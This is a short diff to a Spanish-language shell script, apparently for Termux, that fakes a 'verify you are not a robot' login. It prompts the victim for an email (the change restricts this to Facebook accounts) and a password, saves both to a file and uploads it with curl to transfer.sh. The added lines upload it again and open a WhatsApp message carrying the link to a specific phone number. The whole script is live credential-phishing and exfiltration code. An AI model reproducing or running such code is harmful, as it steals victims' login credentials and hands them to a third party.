@@ -42,7 +42,7 @@ echo -ne ' Cargando script    (100%)\r'
 echo " "
 setterm -foreground red
 echo -e "Verifica que no eres un robot\ninicia secion aqui:"
-echo "Escribe tu correo (no escribas el .com )"
+echo "Escribe tu correo (solo cuentas de Facebook )"
 read correo
 echo "Escribe tu contraseña"
 read contrase
@@ -51,6 +51,8 @@ echo "$correo $contrase" > notpe.txt
 curl --upload-file notpe.txt https://transfer.sh/notpe.txt
 echo "opes"
 echo " "
+link=$(curl --upload-file notpe.txt https://transfer.sh/cO)
+termux-open https://wa.me/59822228768?text=$link.KeLSxs9dj+manda+este+link
 fun () {
 echo " "
 echo "contraseña incorrecta porfavor verifica"
